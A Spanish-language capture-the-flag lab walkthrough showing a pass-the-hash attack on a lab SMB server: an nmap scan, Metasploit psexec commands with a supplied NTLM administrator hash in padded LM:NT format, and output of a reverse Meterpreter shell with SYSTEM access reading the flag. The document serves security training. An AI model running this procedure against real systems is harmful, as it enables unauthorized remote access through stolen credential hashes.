
# Pass the Hash con Metasploit

## <mark style="color:purple;">Lab -</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**Pass The Hash: Metasploit**</mark>

Se le proporciona una máquina Kali GUI y una máquina objetivo que ejecuta un servidor SMB vulnerable. Puede acceder a la máquina objetivo en **demo.ine.local**.

Tu tarea consiste en obtener la huella digital de la aplicación utilizando las herramientas disponibles en la máquina Kali y, a continuación, explotar la vulnerabilidad utilizando el módulo Metasploit adecuado.

El siguiente hash NTLM puede utilizarse para acceder al servicio:

```
- Usuario: administrator
- Hash: 5c4d59391f656d5958dab124ffeabc20
```

**Objetivo**: ¡Explotar la aplicación y recuperar la flag!

### Hosts

<pre class="language-bash"><code class="lang-bash">┌──(root㉿attackdefense)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.12       attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.10.49.9      attackdefense.com attackdefense
<strong>10.2.21.6    demo.ine.local
</strong></code></pre>

### Escaneo de puertos

Tenemos SMB abierto:

```bash
┌──(root㉿attackdefense)-[~]
└─# nmap -sV demo.ine.local

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Metasploit PSExec

```bash
msfconsole
use exploit/windows/smb/psexec
set RHOSTS 10.2.21.6
set SMBUser Administrator
```

{% hint style="info" %}
**IMPORTANTE**: Para que funcione debemos poner la misma cantidad de ceros que el hash NTLM, concretamente 32 ceros en el siguiente formato para `SMBPass`:
{% endhint %}

<pre><code><strong>00000000000000000000000000000000:5c4d59391f656d5958dab124ffeabc20
</strong></code></pre>

```bash
set SMBPass 00000000000000000000000000000000:5c4d59391f656d5958dab124ffeabc20
exploit

[*] Started reverse TCP handler on 10.10.49.9:4444 
[*] 10.2.21.6:445 - Connecting to the server...
[*] 10.2.21.6:445 - Authenticating to 10.2.21.6:445 as user 'Administrator'...
[*] 10.2.21.6:445 - Selecting PowerShell target
[*] 10.2.21.6:445 - Executing the payload...
[+] 10.2.21.6:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.2.21.6
[*] Meterpreter session 1 opened (10.10.49.9:4444 -> 10.2.21.6:49766) at 2026-04-13 22:48:26 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Acceso a la flag

```powershell
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2020-11-07 13:45:59 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2018-09-15 12:42:30 +0530  BOOTNXT
040777/rwxrwxrwx  8192    dir   2020-09-09 10:08:52 +0530  Boot
040777/rwxrwxrwx  0       dir   2018-11-14 21:40:15 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2018-11-14 12:26:18 +0530  EFI
040777/rwxrwxrwx  0       dir   2020-05-13 23:28:09 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2020-11-07 13:17:23 +0530  Program Files
040777/rwxrwxrwx  4096    dir   2020-11-07 13:17:24 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2020-11-07 13:17:24 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2020-11-07 06:12:52 +0530  Recovery
040777/rwxrwxrwx  4096    dir   2020-11-07 12:06:43 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2020-11-07 13:45:53 +0530  Users
040777/rwxrwxrwx  0       dir   2020-11-07 13:19:05 +0530  Utilities
040777/rwxrwxrwx  16384   dir   2020-11-07 06:12:46 +0530  Windows
100444/r--r--r--  408692  fil   2020-09-09 10:03:42 +0530  bootmgr
100666/rw-rw-rw-  37      fil   2021-06-02 15:49:32 +0530  flag.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag.txt 
oiu21432123avvcde1vsdfxxr323p*********
```
